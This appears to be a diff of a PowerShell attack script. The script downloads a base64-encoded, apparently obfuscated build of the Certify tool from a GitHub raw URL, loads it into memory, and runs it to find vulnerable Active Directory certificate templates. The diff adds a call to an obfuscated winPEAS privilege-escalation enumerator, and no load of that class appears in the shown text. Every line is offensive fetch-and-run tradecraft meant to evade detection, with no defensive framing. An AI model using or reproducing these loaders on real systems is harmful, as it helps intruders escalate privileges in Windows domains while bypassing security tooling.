@@ -1,3 +1,9 @@
 $b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/default/Certify.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
 [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
 [Certify.Program]::Main("find /vulnerable".Split())
+
+
+
+# winpeas obfuscated
+
+[winPEAS.UHJvZ3JhbUFB]::Main("".Split())
